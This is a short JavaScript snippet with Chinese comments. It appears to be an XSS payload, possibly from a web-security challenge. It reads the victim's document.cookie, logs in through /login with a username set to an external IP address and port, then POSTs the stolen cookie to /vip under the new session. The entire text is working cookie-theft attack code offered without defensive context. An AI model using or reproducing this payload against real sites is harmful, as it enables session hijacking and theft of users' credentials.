// 创建第二个表单
var dataForm = new FormData();
dataForm.append('cookie', document.cookie);

var xhr1 = new XMLHttpRequest();
var params = 'username=http://106.15.6.181:2333&password=e11945b430fdc18c70c1ade389c5fefb';
xhr1.open('POST', '/login');
xhr1.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr1.onreadystatechange = function () {
    if (xhr1.readyState === 4 && xhr1.status === 200) {
        // 获取Cookie
        var cookie = xhr1.getResponseHeader('Set-Cookie');

        // 发送第二个表单
        var xhr2 = new XMLHttpRequest();
        xhr2.open('POST', '/vip');
        xhr2.onreadystatechange = function () {
            if (xhr2.readyState === 4 && xhr2.status === 200) {
                // 处理数据请求的响应
                console.log(xhr2.responseText);
            }
        };
        // 设置请求头带上Cookie
        xhr2.setRequestHeader('Cookie', cookie);
        // 发送第二个表单
        xhr2.send(dataForm);
    }
};
xhr1.send(params);
